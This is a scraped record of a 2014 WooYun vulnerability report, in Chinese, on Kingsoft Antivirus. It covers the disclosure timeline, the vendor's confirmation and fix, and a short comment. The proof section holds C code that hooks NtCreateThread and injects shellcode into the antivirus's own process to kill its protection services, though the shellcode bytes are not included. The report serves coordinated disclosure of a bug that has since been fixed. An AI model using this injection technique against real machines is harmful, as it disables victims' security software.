{"id": 48017, "wybug_id": "wooyun-2014-078975", "wybug_title": "金山毒霸全防御失效漏洞", "wybug_corp": "金山毒霸", "wybug_author": "alvin", "wybug_date": "2014-10-11 14:46", "wybug_open_date": "2015-01-09 14:48", "wybug_type": "拒绝服务", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-09：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 金山毒霸全防御及自保护都开启的环境下，用户态程序可以轻易杀掉金山毒霸的所有守护进程。 详细说明：  1.攻击前：\n\n2.攻击后：\n\nexp触发后，金山毒霸的守护进程已经被杀掉。   漏洞证明：  \nLONG WINAPI NewCreateThread(PVOID p1, PVOID p2, PVOID p3, PVOID p4, PVOID p5, PVOID p6,PVOID p7,PVOID p8){\t\tPBYTE pBase = (PBYTE)VirtualAllocEx(p4, NULL, 0x400, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\tBOOL bWrite = FALSE;\tDWORD dwWritten = 0;\tbWrite = WriteProcessMemory(p4, (LPVOID)pBase, shellCode, sizeof(shellCode), &dwWritten);\t*((DWORD*)((PBYTE)p6 + 0xb0)) = (DWORD)pBase;\treturn (fnNtCreateThread)(p1, p2, p3, p4, p5, p6,p7,p8);}int _tmain(int argc, _TCHAR* argv[]){\tLPCTSTR lpszProcess = _T(\"C:\\\\Program Files\\\\kingsoft\\\\kingsoft antivirus\\\\ksoftmgr.exe\");\tPROCESS_INFORMATION pi = { 0 };\tSTARTUPINFO si = { 0 };\tsi.cb = sizeof(STARTUPINFO);\t\tDetourProc((PVOID)GetProcAddress(GetModuleHandle(_T(\"ntdll\")),  \"NtCreateThread\"), (PVOID)NewCreateThread, (PVOID*)(&fnNtCreateThread));\tCreateProcess(lpszProcess, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);}\n   修复方案：  增强对守护进程的自保护逻辑   版权声明：转载请注明来源 alvin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-10-12 19:37 厂商回复： 非常感谢您的反馈，我们已启动修复 最新状态： 2014-11-12：已修复  ", "replys": "漏洞评价：\n评论\n     2014-11-03 11:40 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  需要管理员权限吗？还是说一般的user权限也可以了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}